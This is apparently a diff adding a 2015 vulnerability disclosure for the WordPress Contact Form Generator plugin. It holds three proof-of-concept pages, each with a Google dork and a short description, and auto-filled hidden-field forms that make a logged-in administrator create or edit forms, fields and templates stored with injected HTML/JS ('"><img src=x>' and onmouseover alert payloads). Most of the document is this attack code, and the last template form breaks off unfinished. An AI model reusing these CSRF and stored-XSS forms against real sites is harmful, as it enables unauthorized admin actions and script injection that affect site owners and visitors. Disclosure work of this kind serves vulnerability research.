@@ -1,0 +1,667 @@
+﻿<html>
+  <!--
+  # Exploit Title: WordPress Contact Form Generator v2.0.1 and below (create/update field for contact form) CSRF and Persistent issue
+  # Date: 2015-09-04
+  # Google Dork: Index of /wp-content/plugins/contact-form-generator/
+  # Exploit Author: Joaquin Ramirez Martinez [ i0akiN SEC-LABORATORY ]
+  # Vendor Homepage: http://creative-solutions.net/
+  # plugin uri: http://creative-solutions.net/wordpress/contact-form-generator/
+  # Software Link: https://downloads.wordpress.org/plugin/contact-form-generator.zip
+  # Version: 2.0.1
+  # Tested on: windows 10 + firefox. 
+
+  ======================
+    Description (plugin)
+  ======================
+  Contact Form Generator is a powerful contact form builder for WordPress! See <a href="http://creative-solutions.net/wordpress/contact-
+  form-generator/demo">Live Demos</a>. It is packed with a <a href="http://creative-solutions.net/wordpress/contact-form-generator/
+  template-creator-demo">Template Creator Wizard</a> to create fantastic forms in a matter of seconds without coding.
+  (copy of ´contactformgenerator.php´ file)
+  ===================
+   TECHNICAL DETAILS
+  ===================
+  A CSRF issue was found in the latest version of the plugin for wordpress 'Contact Form Generator'.
+  The issue can be exploited by sending a special link to a wordpress administrator having installed the vulnerable plugin.
+
+  form field creation: when the victim accesses the sent link, will create a new form and inject HTML / JS code
+  without knowing.
+
+  Update form field: when the victim accesses the link, will update information of the form identified for ´id´
+  parameter by injecting HTML / JS code.
+
+  -->
+  <!--
+  ================================
+   Field form creation [CSRF PoC]
+  ================================
+  -->
+  <body>
+    <form action="http://localhost/wordpress2/wp-admin/admin.php?page=cfg_forms&act=cfg_submit_data&holder=fields" method="POST">
+      <input type="hidden" name="name" value=">"<img&#32;src&#61;x>" />
+      <input type="hidden" name="id&#95;form" value="8" /> <!-- an existing form id value for this element -->
+      <input type="hidden" name="id&#95;type" value="1" />
+      <input type="hidden" name="task" value="save" />
+      <input type="hidden" name="id" value="0" />
+      <input type="submit" value="Click me for create a field" />
+    </form>
+  </body>
+ <!--
+  ================================
+   Field form update [CSRF PoC]
+  ================================
+  -->
+  <body>
+    <form action="http://localhost/wordpress2/wp-admin/admin.php?page=cfg_forms&act=cfg_submit_data&holder=fields" method="POST">
+      <input type="hidden" name="name" value="s"&#32;onmouseover&#61;"alert&#40;&#47;i0&#45;sec&#47;&#41;"&#32;a&#61;" />
+      <input type="hidden" name="tooltip&#95;text" value="s"&#32;onmouseover&#61;"alert&#40;&#47;i0&#45;sec&#47;&#41;"&#32;a&#61;" />
+      
+      <input type="hidden" name="id&#95;form" value="3" /> <!-- an existing form id value -->
+      
+      <input type="hidden" name="id&#95;type" value="1" />
+      <input type="hidden" name="column&#95;type" value="0" />
+      <input type="hidden" name="required" value="0" />
+      <input type="hidden" name="published" value="1" />
+      <input type="hidden" name="width" value="s"&#32;onmouseover&#61;"alert&#40;&#47;i0&#45;sec&#47;&#41;"&#32;a&#61;" />
+      <input type="hidden" name="field&#95;margin&#95;top" value="s"&#32;onmouseover&#61;"alert&#40;&#47;i0&#45;sec&#47;&#41;"&#32;a&#61;" />
+      <input type="hidden" name="task" value="save" />
+
+      <input type="hidden" name="id" value="7" />  <!-- field id to edit -->
+
+      <input type="submit" value="Click me for update a field" />
+    </form>
+  </body>
+</html>
+<!--
+  2015-09-02: vulnerability found
+  2015-09-04: Reported to vendor
+  2015-09-04: Full disclosure  
+-->
+
+<html>
+  <!--
+  # Exploit Title: WordPress Contact Form Generator v2.0.1 and below (create/update form) CSRF and Persistent issue
+  # Date: 2015-09-04
+  # Google Dork: Index of /wp-content/plugins/contact-form-generator/
+  # Exploit Author: Joaquin Ramirez Martinez [ i0akiN SEC-LABORATORY ]
+  # Vendor Homepage: http://creative-solutions.net/
+  # plugin uri: http://creative-solutions.net/wordpress/contact-form-generator/
+  # Software Link: https://downloads.wordpress.org/plugin/contact-form-generator.zip
+  # Version: 2.0.1
+  # Tested on: windows 10 + firefox. 
+
+  ======================
+    Description (plugin)
+  ======================
+  Contact Form Generator is a powerful contact form builder for WordPress! See <a href="http://creative-solutions.net/wordpress/contact-
+  form-generator/demo">Live Demos</a>. It is packed with a <a href="http://creative-solutions.net/wordpress/contact-form-generator/
+  template-creator-demo">Template Creator Wizard</a> to create fantastic forms in a matter of seconds without coding.
+  (copy of ´contactformgenerator.php´ file)
+  ===================
+   TECHNICAL DETAILS
+  ===================
+  A CSRF issue was found in the latest version of the plugin for wordpress 'Contact Form Generator'.
+  The issue can be exploited by sending a special link to a wordpress administrator having installed the vulnerable plugin.
+
+  template creation: when the victim accesses the sent link, will create a new form and inject HTML / JS code
+  without knowing.
+
+  Update form: when the victim accesses the link, will update information of the form identified for ´id´
+  parameter by injecting HTML / JS code.
+  -->
+   <!-- 
+  =========================
+   Create form [CSRF PoC ]
+  =========================
+  payload: "><img src=[x]><
+  -->
+
+  <body>
+    <form action="http://localhost/wordpress2/wp-admin/admin.php?page=cfg_forms&act=cfg_submit_data&holder=forms" method="POST">
+      <input type="hidden" name="name" value="dsSASA&quot;&gt;&lt;img&#32;src&#61;1&gt;&lt;" />
+      <input type="hidden" name="top&#95;text" value="xds&quot;&gt;&lt;img&#32;src&#61;2&gt;&lt;" />
+      <input type="hidden" name="pre&#95;text" value="&lt;&#47;textarea&gt;&quot;&gt;&lt;img&#32;src&#61;3&gt;&lt;" />
+      <input type="hidden" name="thank&#95;you&#95;text" value="Message&#32;successfully&#32;sent&quot;&gt;&lt;img&#32;src&#61;4&gt;&lt;" />
+      <input type="hidden" name="send&#95;text" value="Send&quot;&gt;&lt;img&#32;src&#61;5&gt;&lt;" />
+      <input type="hidden" name="send&#95;new&#95;text" value="New&#32;email&quot;&gt;&lt;img&#32;src&#61;6&gt;&lt;" />
+      <input type="hidden" name="close&#95;alert&#95;text" value="Close&quot;&gt;&lt;img&#32;src&#61;7&gt;&lt;" />
+      <input type="hidden" name="form&#95;width" value="100&#37;&quot;&gt;&lt;img&#32;src&#61;8&gt;&lt;" />
+      <input type="hidden" name="id&#95;template" value="0" /> 
+      <input type="hidden" name="email&#95;to" value="&quot;&gt;&lt;img&#32;src&#61;9&gt;&lt;" />
+      <input type="hidden" name="email&#95;bcc" value="&quot;&gt;&lt;img&#32;src&#61;10&gt;&lt;" />
+      <input type="hidden" name="email&#95;subject" value="&quot;&gt;&lt;img&#32;src&#61;11&gt;&lt;" />
+      <input type="hidden" name="email&#95;from" value="&quot;&gt;&lt;img&#32;src&#61;12&gt;&lt;" />
+      <input type="hidden" name="email&#95;from&#95;name" value="&quot;&gt;&lt;img&#32;src&#61;13&gt;&lt;" />
+      <input type="hidden" name="email&#95;replyto" value="&quot;&gt;&lt;img&#32;src&#61;14&gt;&lt;" />
+      <input type="hidden" name="email&#95;replyto&#95;name" value="&quot;&gt;&lt;img&#32;src&#61;15&gt;&lt;" />
+      <input type="hidden" name="redirect" value="0" />
+      <input type="hidden" name="redirect&#95;itemid" value="2&quot;&gt;&lt;img&#32;src&#61;17&gt;&lt;" />
+      <input type="hidden" name="redirect&#95;url" value="&quot;&gt;&lt;img&#32;src&#61;16&gt;&lt;" />
+      <input type="hidden" name="redirect&#95;delay" value="0" />
+      <input type="hidden" name="send&#95;copy&#95;enable" value="1" />
+      <input type="hidden" name="send&#95;copy&#95;text" value="Send&#32;me&#32;a&#32;copy&quot;&gt;&lt;img&#32;src&#61;17&gt;&lt;" />
+      <input type="hidden" name="shake&#95;count" value="2" />
+      <input type="hidden" name="shake&#95;distanse" value="10" />
+      <input type="hidden" name="shake&#95;duration" value="300" />
+      <input type="hidden" name="email&#95;info&#95;show&#95;referrer" value="1" />
+      <input type="hidden" name="email&#95;info&#95;show&#95;ip" value="1" />
+      <input type="hidden" name="email&#95;info&#95;show&#95;browser" value="1" />
+      <input type="hidden" name="email&#95;info&#95;show&#95;os" value="1" />
+      <input type="hidden" name="email&#95;info&#95;show&#95;sc&#95;res" value="1" />
+      <input type="hidden" name="show&#95;back" value="1" />
+      <input type="hidden" name="published" value="1" />
+      <input type="hidden" name="custom&#95;css" value="&lt;&#47;textarea&gt;&quot;&gt;&lt;img&#32;src&#61;21&gt;&lt;" />
+      <input type="hidden" name="task" value="save" />
+      <input type="hidden" name="id" value="0" /> 
+      <input type="submit" value="Click me for create a form" />
+    </form>
+  </body>
+  <!-- 
+  ==========================
+    Update form [CSRF PoC ]
+  ==========================
+  payload: "><img src=[x]><
+  -->
+  <body>
+    <form action="http://localhost/wordpress2/wp-admin/admin.php?page=cfg_forms&act=cfg_submit_data&holder=forms" method="POST">
+      <input type="hidden" name="name" value="dsSASA&quot;&gt;&lt;img&#32;src&#61;1&gt;&lt;" />
+      <input type="hidden" name="top&#95;text" value="xds&quot;&gt;&lt;img&#32;src&#61;2&gt;&lt;" />
+      <input type="hidden" name="pre&#95;text" value="&lt;&#47;textarea&gt;&quot;&gt;&lt;img&#32;src&#61;3&gt;&lt;" />
+      <input type="hidden" name="thank&#95;you&#95;text" value="Message&#32;successfully&#32;sent&quot;&gt;&lt;img&#32;src&#61;4&gt;&lt;" />
+      <input type="hidden" name="send&#95;text" value="Send&quot;&gt;&lt;img&#32;src&#61;5&gt;&lt;" />
+      <input type="hidden" name="send&#95;new&#95;text" value="New&#32;email&quot;&gt;&lt;img&#32;src&#61;6&gt;&lt;" />
+      <input type="hidden" name="close&#95;alert&#95;text" value="Close&quot;&gt;&lt;img&#32;src&#61;7&gt;&lt;" />
+      <input type="hidden" name="form&#95;width" value="100&#37;&quot;&gt;&lt;img&#32;src&#61;8&gt;&lt;" />
+      <input type="hidden" name="id&#95;template" value="0" /> 
+      <input type="hidden" name="email&#95;to" value="&quot;&gt;&lt;img&#32;src&#61;9&gt;&lt;" />
+      <input type="hidden" name="email&#95;bcc" value="&quot;&gt;&lt;img&#32;src&#61;10&gt;&lt;" />
+      <input type="hidden" name="email&#95;subject" value="&quot;&gt;&lt;img&#32;src&#61;11&gt;&lt;" />
+      <input type="hidden" name="email&#95;from" value="&quot;&gt;&lt;img&#32;src&#61;12&gt;&lt;" />
+      <input type="hidden" name="email&#95;from&#95;name" value="&quot;&gt;&lt;img&#32;src&#61;13&gt;&lt;" />
+      <input type="hidden" name="email&#95;replyto" value="&quot;&gt;&lt;img&#32;src&#61;14&gt;&lt;" />
+      <input type="hidden" name="email&#95;replyto&#95;name" value="&quot;&gt;&lt;img&#32;src&#61;15&gt;&lt;" />
+      <input type="hidden" name="redirect" value="0" />
+      <input type="hidden" name="redirect&#95;itemid" value="2&quot;&gt;&lt;img&#32;src&#61;17&gt;&lt;" />
+      <input type="hidden" name="redirect&#95;url" value="&quot;&gt;&lt;img&#32;src&#61;16&gt;&lt;" />
+      <input type="hidden" name="redirect&#95;delay" value="0" />
+      <input type="hidden" name="send&#95;copy&#95;enable" value="1" />
+      <input type="hidden" name="send&#95;copy&#95;text" value="Send&#32;me&#32;a&#32;copy&quot;&gt;&lt;img&#32;src&#61;17&gt;&lt;" />
+      <input type="hidden" name="shake&#95;count" value="2" />
+      <input type="hidden" name="shake&#95;distanse" value="10" />
+      <input type="hidden" name="shake&#95;duration" value="300" />
+      <input type="hidden" name="email&#95;info&#95;show&#95;referrer" value="1" />
+      <input type="hidden" name="email&#95;info&#95;show&#95;ip" value="1" />
+      <input type="hidden" name="email&#95;info&#95;show&#95;browser" value="1" />
+      <input type="hidden" name="email&#95;info&#95;show&#95;os" value="1" />
+      <input type="hidden" name="email&#95;info&#95;show&#95;sc&#95;res" value="1" />
+      <input type="hidden" name="show&#95;back" value="1" />
+      <input type="hidden" name="published" value="1" />
+      <input type="hidden" name="custom&#95;css" value="&lt;&#47;textarea&gt;&quot;&gt;&lt;img&#32;src&#61;21&gt;&lt;" />
+      <input type="hidden" name="task" value="save" />
+      <input type="hidden" name="id" value="0" /> 
+      <input type="submit" value="Click me for edit form" />
+    </form>
+  </body>
+</html>
+<!--
+  ===========
+   TIMELINE
+  ===========
+  2015-09-02: vulnerability found
+  2015-09-04: Reported to vendor
+  2015-09-04: Full disclosure
+-->
+
+<html>
+  <!--
+  # Exploit Title: WordPress Contact Form Generator v2.0.1 and below (create/update template for contact form) CSRF and Persistent issue
+  # Date: 2015-09-04
+  # Google Dork: Index of /wp-content/plugins/contact-form-generator/
+  # Exploit Author: Joaquin Ramirez Martinez [ i0akiN SEC-LABORATORY ]
+  # Vendor Homepage: http://creative-solutions.net/
+  # plugin uri: http://creative-solutions.net/wordpress/contact-form-generator/
+  # Software Link: https://downloads.wordpress.org/plugin/contact-form-generator.zip
+  # Version: 2.0.1
+  # Tested on: windows 10 + firefox. 
+
+  ======================
+    Description (plugin)
+  ======================
+  Contact Form Generator is a powerful contact form builder for WordPress! See <a href="http://creative-solutions.net/wordpress/contact-
+  form-generator/demo">Live Demos</a>. It is packed with a <a href="http://creative-solutions.net/wordpress/contact-form-generator/
+  template-creator-demo">Template Creator Wizard</a> to create fantastic forms in a matter of seconds without coding.
+  (copy of ´contactformgenerator.php´ file)
+  ===================
+   TECHNICAL DETAILS
+  ===================
+  A CSRF issue was found in the latest version of the plugin for wordpress 'Contact Form Generator'.
+  The issue can be exploited by sending a special link to a wordpress administrator having installed the vulnerable plugin.
+
+  template creation: when the victim accesses the sent link, will create a new template and inject HTML / JS code
+  without knowing.
+
+  Update template: when the victim accesses the link, will update information of the template identified for ´id´
+  parameter by injecting HTML / JS code.
+
+  -->
+  <!-- 
+  ==============================
+  create a template [CSRF PoC ]
+  ==============================
+  payload: "><img src=x>
+  -->
+  <body>
+    <form action="http://localhost/wordpress2/wp-admin/admin.php?page=cfg_forms&act=cfg_submit_data&holder=templates" method="POST">
+      <input type="hidden" name="name" value="xsa&quot;&gt;&lt;img&#32;src&#61;x&gt;" />  <!-- persistent form name [XSS] -->
+      <input type="hidden" name="published" value="1" />
+      <input type="hidden" name="task" value="save" />
+      <input type="hidden" name="id" value="0" />
+      <input type="submit" value="Click me for add new template" />
+    </form>
+  </body>
+  <!-- 
+  ==============================
+  edit a template [CSRF PoC ]
+  ==============================
+  payload: "><img src=x>
+  -->
+  <body>
+    <form action="http://localhost/wordpress2/wp-admin/admin.php?page=cfg_forms&act=cfg_submit_data&holder=templates" method="POST">
+      <input type="hidden" name="name" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;587&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;588&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;131&#93;" value="inherit" />
+      <input type="hidden" name="styles&#91;589&#93;" value="1" />
+      <input type="hidden" name="styles&#91;629&#93;" value="dark&#45;thin" />
+      <input type="hidden" name="styles&#91;630&#93;" value="dark&#45;thin" />
+      <input type="hidden" name="styles&#91;627&#93;" value="0" />
+      <input type="hidden" name="styles&#91;0&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;130&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;517&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;518&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;1&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;2&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;3&#93;" value="solid" />
+      <input type="hidden" name="styles&#91;4&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;5&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;6&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;7&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;8&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;9&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;10&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;11&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;12&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;13&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;14&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;15&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;16&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;17&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;18&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;19&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;600&#93;" value="0" />
+      <input type="hidden" name="styles&#91;601&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;602&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;603&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;604&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;605&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;606&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;607&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;608&#93;" value="solid" />
+      <input type="hidden" name="styles&#91;609&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;610&#93;" value="0" />
+      <input type="hidden" name="styles&#91;611&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;612&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;613&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;614&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;615&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;616&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;617&#93;" value="0" />
+      <input type="hidden" name="styles&#91;618&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;619&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;620&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;621&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;622&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;623&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;624&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;625&#93;" value="solid" />
+      <input type="hidden" name="styles&#91;626&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;20&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;21&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;22&#93;" value="normal" />
+      <input type="hidden" name="styles&#91;23&#93;" value="normal" />
+      <input type="hidden" name="styles&#91;24&#93;" value="none" />
+      <input type="hidden" name="styles&#91;25&#93;" value="left" />
+      <input type="hidden" name="styles&#91;506&#93;" value="inherit" />
+      <input type="hidden" name="styles&#91;510&#93;" value="cfg&#95;font&#95;effect&#95;none" />
+      <input type="hidden" name="styles&#91;27&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;28&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;29&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;30&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;190&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;191&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;192&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;502&#93;" value="left" />
+      <input type="hidden" name="styles&#91;193&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;194&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;195&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;196&#93;" value="solid" />
+      <input type="hidden" name="styles&#91;197&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;198&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;199&#93;" value="normal" />
+      <input type="hidden" name="styles&#91;200&#93;" value="normal" />
+      <input type="hidden" name="styles&#91;201&#93;" value="none" />
+      <input type="hidden" name="styles&#91;202&#93;" value="inherit" />
+      <input type="hidden" name="styles&#91;511&#93;" value="cfg&#95;font&#95;effect&#95;none" />
+      <input type="hidden" name="styles&#91;203&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;204&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;205&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;206&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;215&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;216&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;217&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;218&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;31&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;32&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;33&#93;" value="normal" />
+      <input type="hidden" name="styles&#91;34&#93;" value="normal" />
+      <input type="hidden" name="styles&#91;35&#93;" value="none" />
+      <input type="hidden" name="styles&#91;36&#93;" value="left" />
+      <input type="hidden" name="styles&#91;507&#93;" value="inherit" />
+      <input type="hidden" name="styles&#91;512&#93;" value="cfg&#95;font&#95;effect&#95;none" />
+      <input type="hidden" name="styles&#91;37&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;38&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;39&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;40&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;41&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;42&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;43&#93;" value="normal" />
+      <input type="hidden" name="styles&#91;44&#93;" value="normal" />
+      <input type="hidden" name="styles&#91;509&#93;" value="inherit" />
+      <input type="hidden" name="styles&#91;46&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;47&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;48&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;49&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;505&#93;" value="white" />
+      <input type="hidden" name="styles&#91;508&#93;" value="inherit" />
+      <input type="hidden" name="styles&#91;132&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;133&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;168&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;519&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;520&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;500&#93;" value="left" />
+      <input type="hidden" name="styles&#91;501&#93;" value="left" />
+      <input type="hidden" name="styles&#91;134&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;135&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;136&#93;" value="solid" />
+      <input type="hidden" name="styles&#91;137&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;138&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;139&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;140&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;141&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;142&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;143&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;144&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;145&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;146&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;147&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;148&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;149&#93;" value="normal" />
+      <input type="hidden" name="styles&#91;150&#93;" value="normal" />
+      <input type="hidden" name="styles&#91;151&#93;" value="none" />
+      <input type="hidden" name="styles&#91;152&#93;" value="inherit" />
+      <input type="hidden" name="styles&#91;153&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;154&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;155&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;156&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;157&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;158&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;159&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;160&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;161&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;162&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;163&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;164&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;165&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;166&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;167&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;513&#93;" value="cfg&#95;font&#95;effect&#95;none" />
